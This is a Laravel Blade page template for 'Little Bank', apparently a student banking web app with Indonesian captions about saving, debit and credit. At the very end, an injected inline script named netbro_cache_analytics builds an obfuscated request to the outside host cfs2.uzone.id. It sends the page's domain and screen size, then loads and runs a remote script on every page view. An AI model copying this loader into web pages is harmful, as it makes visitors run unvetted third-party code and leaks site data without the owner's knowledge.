
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Carousel Template for Bootstrap</title>

    <!-- Bootstrap core CSS -->
    <link href="{{ asset('css/bootstrap.min.css') }}" rel="stylesheet">
        <link href="{{ asset('css/footer.css') }}" rel="stylesheet">
      
      <!-- Custom styles for this template -->
    <link href="{{ asset('css/carousel.css') }}" rel="stylesheet">

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="{{ asset('css/ie10-viewport-bug-workaround.css') }}" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="{{ asset('js/ie-emulation-modes-warning.js') }}"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

    
  </head>
<!-- NAVBAR
================================================== -->
  <body>
    <div class="navbar-wrapper">
      <div class="container">

        <nav class="navbar navbar-inverse navbar-static-top">
          <div class="container">
            <div class="navbar-header">
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
              </button>
              <a class="navbar-brand" href="{{ url('home')  }}">Little Bank</a>
            </div>
            <div id="navbar" class="navbar-collapse collapse">
              <ul class="nav navbar-nav">
                <li class="active"><a href="{{ url('home')  }}">Home</a></li>
                <li><a href="{{ url('nasabah')  }}">Nasabah</a></li>
                   <li><a href="{{ url('laporan/pdf')  }}">Laporan PDF</a></li>
                   <li><a href="{{ url('laporan/excel')  }}">Laporan Excel</a></li>
              </ul>
                
                 <ul class="nav navbar-nav navbar-right">
            <li class="active"><a href="./"> {{ Auth::user()->name }} <span class="sr-only">(current)</span></a></li>
            <li><a href="{{ url('logout') }}">Log Out</a></li>
          </ul>
                
              
                
            </div>   
          </div>
        </nav>

      </div>
    </div>


   <!-- Carousel
    ================================================== -->
    <div id="myCarousel" class="carousel slide" data-ride="carousel">
      <!-- Indicators -->
      <ol class="carousel-indicators">
        <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
        <li data-target="#myCarousel" data-slide-to="1"></li>
        <li data-target="#myCarousel" data-slide-to="2"></li>
      </ol>
      <div class="carousel-inner" role="listbox">
        <div class="item active">
          <img class="first-slide" src="{{ asset('picture/bank1.jpg') }}">
          <div class="container">
            <div class="carousel-caption">
              <h1>Little Bank</h1>
              <p>Selamat Datang di Little Bank , Aplikasi yang membantu untuk menabung dan juga untuk penarikan Saldo Anda</p>
            </div>
          </div>
        </div>
        <div class="item">
          <img class="second-slide" src="{{ asset('picture/debit1.jpg') }}">
          <div class="container">
            <div class="carousel-caption">
              <h1>Debit Card</h1>
              <p>Anda Bisa Menambahkan Saldo Anda Dengan Kartu Debit</p>
            </div>
          </div>
        </div>
        <div class="item">
          <img class="third-slide" src="{{ asset('picture/kredit2.jpg') }}">
          <div class="container">
            <div class="carousel-caption">
              <h1>Credit Card</h1>
              <p>Anda Bisa melakukan penarikan Saldo dengan Kartu Kredit</p>
            </div>
          </div>
        </div>
      </div>
      <a class="left carousel-control" href="#myCarousel" role="button" data-slide="prev">
        <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
        <span class="sr-only">Previous</span>
      </a>
      <a class="right carousel-control" href="#myCarousel" role="button" data-slide="next">
        <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
        <span class="sr-only">Next</span>
      </a>
    </div><!-- /.carousel -->


    <!-- Marketing messaging and featurettes
    ================================================== -->
    <!-- Wrap the rest of the page in another container to center all the content. -->

    <div class="container marketing">

      <!-- Three columns of text below the carousel -->
      <div class="row">
        <div class="col-lg-4">
          <img class="img-circle" src="{{ asset('picture/bank1.jpg') }}"  width="140" height="140">
          <h2>Menabung</h2>
          <p>Menabung merupakan suatu kegiatan untuk menyisihkan pendapatan atau uang saku kita dengan jumlah tergantung kemampuan kita, dan bisa sewaktu-waktu dapat diambil dalam keadaan mendesak  </p>
        </div><!-- /.col-lg-4 -->
        <div class="col-lg-4">
          <img class="img-circle" src="{{ asset('picture/bank.png') }}" width="140" height="140">
          <h2>Bank</h2>
          <p>Bank yaitu sebuah lembaga keuangan yang berfungsi untuk mengambil simpanan uang kita dan juga meminjamkan uang dan juga menyimpan uang yang sudah kita kumpulkan</p>
        </div><!-- /.col-lg-4 -->
        <div class="col-lg-4">
          <img class="img-circle" src="{{ asset('picture/debit1.jpg') }}" width="140" height="140">
          <h2>Debit</h2>
          <p>Pengertian debit adalah pengurang deposito pada rekening bank atau catatan pada pos pembukuan yang menambah nilai aktiva atau mengurangi jumlah kewajiban. Selain itu debit juga berarti piutang.</p>
        </div><!-- /.col-lg-4 -->  
          
          <div class="col-lg-4">
          <img class="img-circle" src="{{ asset('picture/kredit1.jpg') }}" width="140" height="140">
          <h2>Kredit</h2>
          <p>pengertian kredit adalah suatu penyediaan uang dan juga untuk peminjaman uang , untuk meminjam uang Anda harus melakukan perjanjian dengan bank dan juga harus ditepati janjinya</p>
        </div><!-- /.col-lg-4 -->
          <div class="col-lg-4">
          </div>
          
          
          
      </div><!-- /.row --><br><br>
        
        
        
        


      <!-- START THE FEATURETTES -->

        @yield('content')
        
      <!-- /END THE FEATURETTES -->
        

      <!-- FOOTER -->
        <br><br><br><br>
           
    
    </div><!-- /.container -->
      
      
      <footer class="text-muted well" id="last-footer">
		<section>
		<div class="row" style="font-size:11px;">
		<div class="container">
		<h2 class="subhead" style="text-align:center;">All We Need Is Your Love</h2>
		  

		
    
		<footer>	<div class="row">
			<div class="container text-center">
				<h5>All Rights Reserved © 2017.<a href="https://web.facebook.com/muhammad.restu.13">Mukhammad Restu</a></h5>
			</div>
			</div></footer>
			 </div><!--/.container--> 
			 </div><!--/.row outer--> 
		</section>
				</footer>				
      
      
      
      
      
      
      
      


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"><\/script>')</script>
    <script src="{{ asset('js/bootstrap.min.js') }}"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="{{ asset('js/vendor/holder.min.js') }}"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="{{ ('js/ie10-viewport-bug-workaround.js') }}"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKUYIrn%2bOBTZ9DFXADQrmPnjP5JeHV06aeNI1XFnKToa4kx629hAMpKULPUOyqcOAcSYm8JwmcTNEvLZW3%2bbDnm6TW%2bJ3qkU7j8kys8Uommn6oacaBvEODWGkjcDrrAwU9KQJ2tXRNS6D4ZpXR50rVnxbfkFUIn%2baUwMLnYOWSPBrYGj%2bgy1PQEO2xqc042ZGhR1zE5lWas9mYLofROvKFldVFFtBDRPmbNuEWKTgZPrvEs8DxxR6GwUTirLVcKJILISrzOCr1clVC2zTt%2fvcoQS0wrYY63c3uDQkQmy%2f2MpUClnL80yU4IFZD%2baEnuMSyloSUlE25BNRPaHVafwA4du0nv2nb8mPfOE%2fmR%2bru7llbS3TNnfLifU71YqIN9YPlsvKwKfNLYptvnImr%2f9NWHzz2focOivzKGkCc7t8g6uamiPCoug50oTNH1jfKaw6BZwMQT07ZFDaMC405%2biwFTw6HzniLbSKcp2hU6F7OIrcGjPcf55ivuwM5nyfht6%2f5kcjv%2bl3Ltf7%2fyBpdLWVWrBKkj06%2ftpi1xFom%2f5d60jzhk91jBpuzsg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
